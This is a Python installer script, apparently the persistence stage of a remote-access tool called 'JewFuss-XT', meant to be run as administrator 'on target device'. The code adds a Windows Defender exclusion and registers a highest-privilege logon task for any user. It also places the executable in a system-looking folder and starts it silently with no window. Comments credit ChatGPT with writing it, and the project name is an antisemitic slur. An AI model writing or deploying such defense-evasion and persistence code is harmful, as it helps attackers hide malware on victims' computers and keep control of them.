import os
import shutil
import sys
import subprocess
import PyElevate

# compile command 
#   pyinstaller --onefile --add-binary="builds/JewFuss-XT.exe;." --distpath=builds --workpath=data installer.py

# this is a alternive to the normal startup command for jewfuss-xt, this version will auto exempt from windows defender and create a scheduled task to run as admin for any user on startup
# using the $startup commmand will break this as it moves the location of jewfuss-xt, in witch the scheduled task will not be able to find it etc, so just dont use the command :)
# using this requires a bit of setup, first complie jewfuus-xt and leave it in the builds folder
# than compile this script using the command above, and run it the output exe as as adminastrator on target device

# also you are god damn right chatGPT made this, i dont have the time nor knolage on scheduling tasks using commands

# Define the target directory and name of bundled executable to run
target_dir = r"C:\ProgramData\Microsoft\Windows\Tasks" # can be where ever the fuck you want
app_name = "JewFuss-XT.exe"

def add_defender_exclusion(file_path):
    try:
        defender_command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{file_path}\\""'
        subprocess.run(defender_command, shell=True, check=True)
        print(f"Windows Defender exclusion added for {file_path}")
    except subprocess.CalledProcessError as e:
        print(f"Error adding Defender exclusion: {e}")

def create_scheduled_task(task_name, file_path):
    try:
        schtasks_command = (
            f'schtasks /create /tn "{task_name}" /tr "{file_path}" '
            f'/sc onlogon /ru "INTERACTIVE" /rl highest /f /it'
        )
        
        disable_conditions_command = (
            f'powershell -Command "'
            f'$task = Get-ScheduledTask -TaskName \\"{task_name}\\"; '
            f'$task.Settings.DisallowStartIfOnBatteries = $false; '  # Allow task to start on battery
            f'$task.Settings.StopIfGoingOnBatteries = $false; '      # Do not stop if switching to battery
            f'$task.Settings.ExecutionTimeLimit = \'PT0S\'; '       # Disable time limit
            f'Set-ScheduledTask -TaskName \\"{task_name}\\" -Settings $task.Settings"'
        )

        subprocess.run(schtasks_command, shell=True, check=True)
        subprocess.run(disable_conditions_command, shell=True, check=True)
        
        print(f"Scheduled task '{task_name}' created successfully with modified power & time conditions.")
    
    except subprocess.CalledProcessError as e:
        print(f"Error creating scheduled task: {e}")

# Ensure the script is run with admin privileges
if not PyElevate.elevated():
    input("Please run this installer as an administrator.")
    exit(0)
    
task_name = app_name.replace(".exe", "")

if not os.path.exists(target_dir):
    os.makedirs(target_dir)
    print(f"Created folder: {target_dir}")

if getattr(sys, 'frozen', False):
    temp_dir = sys._MEIPASS
else:
    temp_dir = os.path.dirname(os.path.abspath(__file__))

extracted_app_path = os.path.join(temp_dir, app_name)
final_app_path = os.path.join(target_dir, app_name)

# Move the extracted file to the persistent folder (ensuring it's never deleted)
try:
    if not os.path.exists(final_app_path):
        shutil.copy(extracted_app_path, final_app_path)
        print(f"Copied {app_name} to {final_app_path}")
    else:
        print(f"File already exists at {final_app_path}, skipping copy.")
except Exception as e:
    input(f"Fatal Error: Error moving file: {e}")
    sys.exit(1)

add_defender_exclusion(final_app_path)
create_scheduled_task(task_name, final_app_path)

# Run the copied file silently (no console window)
try:
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    subprocess.Popen(final_app_path, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
    print(f"Started {final_app_path} silently (no console)")
except Exception as e:
    print(f"Error running {app_name}: {e}")
    
input("Press Enter to exit.")    
sys.exit(0)